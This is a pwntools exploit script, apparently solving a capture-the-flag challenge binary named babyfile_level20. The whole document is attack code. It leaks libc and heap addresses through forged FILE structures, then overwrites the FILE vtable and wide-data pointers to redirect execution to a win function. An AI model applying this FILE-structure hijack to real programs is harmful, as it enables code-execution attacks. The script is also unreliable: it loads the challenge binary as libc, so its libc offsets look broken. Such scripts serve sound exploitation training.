from pwn import *
BINARY = "/challenge/babyfile_level20"
context.arch = 'amd64'

p = process(BINARY)
# context.terminal = ['tmux', 'splitw', '-h']
# p = gdb.debug("BINARY, gdbscript='continue')
binary = ELF(BINARY)
libc = ELF(BINARY)

# dummy note
p.sendline(b'new_note')
p.sendline(b'0')
p.sendline(b'8')
p.recv()

win_addr = binary.sym['win']
puts_got = binary.got.puts

# leak libc addr
p.sendline(b'open_file')
p.sendline(b'write_fp')
fs = FileStructure()
payload = fs.write(puts_got, 8)
p.send(payload)
p.recv()

p.sendline(b'write_file')
p.sendline(b'0')
p.recvuntil(b';\n')
puts_leak = p.recv()[0:8]
libc_base = unpack(puts_leak, 'all') - libc.sym['puts']
libc.address = libc_base
print('libc_base = ' + hex(libc_base))

# leak fp address
p.sendline(b'open_file')
p.sendline(b'write_fp')
p.recv()

fp = binary.sym.fp
fs = FileStructure()
payload = fs.write(fp, 8)
p.send(payload)
p.recv()

p.sendline(b'write_file')
p.sendline(b'0')
p.recvuntil(b';\n')
fp_leak = p.recv()[0:8]
fp_leak = unpack(fp_leak, 'all') + 0x1e0
print(f'fp_leak = {hex(fp_leak)}')

# overlapped file struct and wide_data in fp buffer
_wide_vtable_offset = 0xe0
doallocbuf_call_offset = 0x68

fs = FileStructure()
fs.vtable = libc.sym['_IO_wfile_jumps'] + 0x18 - 0x38 # fwrite calling vtable + 0x38
fs._lock = fp_leak - 0x1f0 - 0x2a0 - 0x10 # beginning of heap
fs._wide_data = fp_leak + _wide_vtable_offset

_wide_vtable_loc = fp_leak + _wide_vtable_offset

payload = bytes(fs) + b"\x00" * doallocbuf_call_offset + p64(binary.sym.win)
payload += b"\x00" * (_wide_vtable_offset - doallocbuf_call_offset - 0x8) + p64(_wide_vtable_loc)

p.sendline(b'open_file')
p.sendline(b'write_fp')
p.send(payload)

p.interactive()